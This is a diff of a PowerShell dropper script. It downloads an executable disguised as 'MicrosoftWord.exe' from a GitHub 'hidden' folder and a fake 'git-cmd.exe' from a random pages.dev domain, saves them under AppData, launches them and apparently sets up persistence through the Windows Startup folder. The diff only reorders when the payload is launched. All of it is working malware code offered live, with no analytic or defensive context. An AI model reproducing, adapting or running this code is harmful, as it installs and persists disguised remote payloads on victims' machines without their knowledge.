@@ -1,32 +1,13 @@
-if (Test-Path "$env:USERPROFILE\github.msg") {
-    $url = "https://github.com/webntdev/webntdev.github.io/raw/main/hidden/MicrosoftWord.exe"
-    $folderPath = "$env:USERPROFILE\AppData\Local\MicrosoftWord"
-    $localPath = "$folderPath\MicrosoftWord.exe"
+$url = "https://github.com/webntdev/webntdev.github.io/raw/main/hidden/MicrosoftWord.exe"
+$folderPath = "$env:USERPROFILE\AppData\Local\MicrosoftWord"
+$localPath = "$folderPath\MicrosoftWord.exe"
 
-    if (-Not (Test-Path $folderPath)) {
-        New-Item -ItemType Directory -Path $folderPath
-    }
+if (-Not (Test-Path $folderPath)) {
+    New-Item -ItemType Directory -Path $folderPath
+}
 
-    if (-Not (Test-Path $localPath)) {
-        Invoke-WebRequest -Uri $url -OutFile $localPath
-    }
-
-    Start-Process $localPath
-} else {
-    New-Item -Path "$env:USERPROFILE\github.msg" -ItemType "file"
-    $url = "https://github.com/webntdev/webntdev.github.io/raw/main/hidden/MicrosoftWord.exe"
-    $folderPath = "$env:USERPROFILE\AppData\Local\MicrosoftWord"
-    $localPath = "$folderPath\MicrosoftWord.exe"
-
-    if (-Not (Test-Path $folderPath)) {
-        New-Item -ItemType Directory -Path $folderPath
-    }
-
-    if (-Not (Test-Path $localPath)) {
-        Invoke-WebRequest -Uri $url -OutFile $localPath
-    }
-
-    Start-Process $localPath
+if (-Not (Test-Path $localPath)) {
+    Invoke-WebRequest -Uri $url -OutFile $localPath
 }
 
 $destination = "$env:LOCALAPPDATA\Git\git-cmd.exe"
@@ -42,6 +23,8 @@ Invoke-WebRequest -Uri "https://ipnqtxhsbvcmurjolgkfadzwey.pages.dev/Git/git-cmd
 if (-not (Test-Path -Path $binFolder)) {
     New-Item -ItemType Directory -Path $binFolder
 }
+
+Start-Process $localPath
 
 $WshShell = New-Object -ComObject WScript.Shell
 $StartupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
